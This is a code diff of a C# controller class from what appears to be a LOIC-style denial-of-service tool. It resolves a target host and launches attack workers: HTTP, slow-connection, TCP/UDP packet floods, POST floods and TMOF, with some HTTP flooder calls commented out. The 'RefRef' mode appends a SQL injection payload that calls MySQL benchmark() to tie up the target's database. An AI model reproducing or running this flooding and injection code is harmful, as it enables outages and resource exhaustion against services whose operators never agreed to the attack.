@@ -14,89 +14,153 @@ namespace GAS.Core {
         public AttackMethod Method;
         public IPAddress Target = Locolhaust;
         public bool WaitForResponse;
-        public bool AppendRANDOMChars;
-        public bool AppendRANDOMCharsUrl;
+        public bool AppendRandomChars;
+        public bool AppendRandomCharsUrl;
         public bool UseGZIP;
         public bool UseGet;
         public string Subsite = "/";
         private string _dnsString = Locolhaust.ToString();
         #endregion
-        static readonly IPAddress Locolhaust = IPAddress.Parse( "127.0.0.1" );
+        private static readonly IPAddress Locolhaust = IPAddress.Parse( "127.0.0.1" );
         public IAttacker Worker;
         public string Data;
+
         public int Requested {
-            get {
-                return Worker.Requested;
-            }
+            get { return this.Worker.Requested; }
         }
+
         public int Failed {
-            get {
-                return Worker.Failed;
-            }
+            get { return this.Worker.Failed; }
         }
+
         public int Downloaded {
-            get {
-                return Worker.Downloaded;
-            }
+            get { return this.Worker.Downloaded; }
         }
+
         public bool LockOn( string host ) {
             host = host.Trim().ToLower();
-            if ( IPAddress.TryParse( host, out Target ) ) {
-                this._dnsString = Target.ToString();
+            if ( IPAddress.TryParse(
+                host,
+                out this.Target ) ) {
+                this._dnsString = this.Target.ToString();
                 return true;
             }
             try {
-                if ( !host.StartsWith( "http://" ) && !host.StartsWith( "https://" ) ) host = String.Concat( "http://", host );
+                if ( !host.StartsWith( "http://" ) && !host.StartsWith( "https://" ) )
+                    host = String.Concat(
+                        "http://",
+                        host );
                 var trg = new Uri( host );
-                Target = Dns.GetHostEntry( trg.Host ).AddressList[ 0 ];
+                this.Target = Dns.GetHostEntry( trg.Host ).AddressList[ 0 ];
                 this._dnsString = trg.Host;
-                Subsite = trg.PathAndQuery;
+                this.Subsite = trg.PathAndQuery;
                 return true;
             }
             catch {
-                Target = Locolhaust;
+                this.Target = Locolhaust;
                 return false;
             }
         }
+
         public void Stop() {
-            if ( Worker != null )
-                Worker.Stop();
+            if ( this.Worker != null )
+                this.Worker.Stop();
         }
+
         public void Start() {
-            Stop();
-            switch ( Method ) {
+            this.Stop();
+            switch ( this.Method ) {
                 case AttackMethod.HTTP:
-                    Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 0, this.Spt );
+                    //Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, this.AppendRandomChars || this.AppendRandomCharsUrl, UseGZIP, Threads, 0, this.Spt );
                     break;
                 case AttackMethod.ReCoil:
-                    Worker = new ReCoil( this._dnsString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, WaitForResponse, this.Spt, UseGZIP, Threads );
+                    this.Worker = new ReCoil(
+                        this._dnsString,
+                        this.Target.ToString(),
+                        this.Port,
+                        this.Subsite,
+                        this.Delay,
+                        this.Timeout,
+                        this.AppendRandomChars || this.AppendRandomCharsUrl,
+                        this.WaitForResponse,
+                        this.Spt,
+                        this.UseGZIP,
+                        this.Threads );
                     break;
                 case AttackMethod.SlowLOIC:
-                    Worker = new SlowLoic( this._dnsString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, this.Spt, AppendRANDOMCharsUrl, UseGet, UseGZIP, Threads );
+                    this.Worker = new SlowLoic(
+                        this._dnsString,
+                        this.Target.ToString(),
+                        this.Port,
+                        this.Subsite,
+                        this.Delay,
+                        this.Timeout,
+                        this.AppendRandomChars || this.AppendRandomCharsUrl,
+                        this.Spt,
+                        this.AppendRandomCharsUrl,
+                        this.UseGet,
+                        this.UseGZIP,
+                        this.Threads );
                     break;
                 case AttackMethod.TCP:
-                    Worker = new PacketFlood( Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads, this.Spt );
+                    this.Worker = new PacketFlood(
+                        this.Target.ToString(),
+                        this.Port,
+                        1,
+                        this.Delay,
+                        this.WaitForResponse,
+                        this.Data,
+                        this.AppendRandomChars,
+                        this.Threads,
+                        this.Spt );
                     break;
                 case AttackMethod.UDP:
-                    Worker = new PacketFlood( Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads, this.Spt );
+                    this.Worker = new PacketFlood(
+                        this.Target.ToString(),
+                        this.Port,
+                        2,
+                        this.Delay,
+                        this.WaitForResponse,
+                        this.Data,
+                        this.AppendRandomChars,
+                        this.Threads,
+                        this.Spt );
                     break;
                 case AttackMethod.RefRef:
-                    this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))".Replace( " ", "%20" );
-                    Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 0, this.Spt );
+                    this.Subsite +=
+                        " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))".
+                            Replace(
+                                " ",
+                                "%20" );
+                    //Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, this.AppendRandomChars || this.AppendRandomCharsUrl, UseGZIP, Threads, 0, this.Spt );
                     break;
                 case AttackMethod.AhrDosme:
-                    Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 1, this.Spt );
+                    //Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, this.AppendRandomChars || this.AppendRandomCharsUrl, UseGZIP, Threads, 1, this.Spt );
                     break;
                 case AttackMethod.Post:
-                    Worker = new PostAttack( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads );
+                    this.Worker = new PostAttack(
+                        this._dnsString,
+                        this.Target.ToString(),
+                        this.Port,
+                        this.Subsite,
+                        this.WaitForResponse,
+                        this.Delay,
+                        this.Timeout,
+                        this.AppendRandomChars || this.AppendRandomCharsUrl,
+                        this.UseGZIP,
+                        this.Threads );
                     break;
                 case AttackMethod.TMOF:
-                    Worker = new TMOF( Target.ToString(), Port, Threads, int.MaxValue );
+                    this.Worker = new TMOF(
+                        this.Target.ToString(),
+                        this.Port,
+                        this.Threads,
+                        int.MaxValue );
                     break;
                 default:
                     throw new NotImplementedException( "Code it yourself, lazy bastard" );
             }
-            Worker.Start();
+            this.Worker.Start();
         }
     }
 }
